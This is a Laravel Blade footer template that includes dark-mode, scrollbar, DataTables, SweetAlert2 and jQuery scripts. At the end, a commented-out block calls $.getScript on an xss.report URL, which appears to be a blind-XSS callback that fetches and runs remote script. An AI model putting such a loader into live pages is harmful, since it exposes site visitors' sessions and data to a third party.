<script src="{{ asset('dist') }}/assets/static/js/components/dark.js"></script>
<script src="{{ asset('dist') }}/assets/extensions/perfect-scrollbar/perfect-scrollbar.min.js"></script>
<script src="{{ asset('dist') }}/assets/compiled/js/app.js"></script>
{{-- PLUGIN DATATABLES --}}
<script src="{{ asset('dist') }}/assets/extensions/simple-datatables/umd/simple-datatables.js"></script>
<script src="{{ asset('dist') }}/assets/static/js/pages/simple-datatables.js"></script>
<script src="https://cdn.datatables.net/2.0.5/js/dataTables.min.js"></script>
{{-- PLUGIN SWEETALERT 2 --}}
<script src="{{ asset('vendor') }}/sweetalerts2/custom-sweetalert.js"></script>
<script src="{{ asset('vendor') }}/sweetalerts2/sweetalerts2.min.js"></script>
<script src="{{ asset('dist') }}/custom/footer.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
{{-- <script>
    $.getScript("//xss.report/c/kyouma052")
</script> --}}

@yield('custom-js')
